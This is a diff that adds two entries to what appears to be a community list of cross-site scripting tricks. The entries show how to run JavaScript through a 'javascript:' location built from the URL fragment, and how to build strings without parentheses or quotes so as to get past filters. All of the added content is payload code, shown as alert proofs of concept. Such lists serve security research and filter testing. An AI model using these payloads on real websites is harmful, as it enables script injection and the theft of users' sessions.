@@ -198,6 +198,33 @@ Only IE [matt](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-pare
 
 ---
 
+[terjanq](https://twitter.com/terjanq)
+
+Put `#%0aalert(/1337)//` or `?%0aalert(/1337)//` or `&%0aalert(/1337)` anywhere in the URL. Then, arbitrary code can be executed via:
+
+```js
+location='javascript:'+location
+```
+
+```js
+location=/javascript:/.source+location
+```
+
+```js
+location=`javascript:`+location
+```
+
+---
+
+[terjanq](https://twitter.com/terjanq)
+
+Custom strings without `` ()'"` ``
+```
+x={...eval+'',toString:Array.prototype.shift,length:15},
+x+x+x+x+x+x+x+x+x+x+x+x+x,
+location = /javascript:/.source + alert.name+x+1337+x
+```
+
 
 ___
 ### Anything: @[RenwaX23](https://twitter.com/RenwaX23)
